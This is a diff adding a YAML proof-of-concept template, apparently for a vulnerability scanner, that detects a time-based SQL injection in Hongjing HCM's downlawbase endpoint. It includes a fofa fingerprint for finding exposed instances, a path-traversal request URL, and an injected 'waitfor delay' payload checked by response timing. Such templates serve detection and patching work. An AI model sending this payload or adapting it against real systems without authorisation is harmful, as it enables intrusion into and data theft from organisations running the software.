@@ -1,0 +1,16 @@
+id: poc-yaml-hongjing-hcm-downlawbase-sqli
+info:
+  name: 宏景HCM downlawbase SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 宏景 HCM
+  fofa: app="HJSOFT-HCM"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 1
+requests:
+- method: GET
+  path: /templates/attestation/../../selfservice/lawbase/downlawbase?id=11';waitfor+delay+'0:0:{{.t1}}'--
+  expression: status_code == 200 && body == "" && duration >= t1 && duration < t2
+transport: http
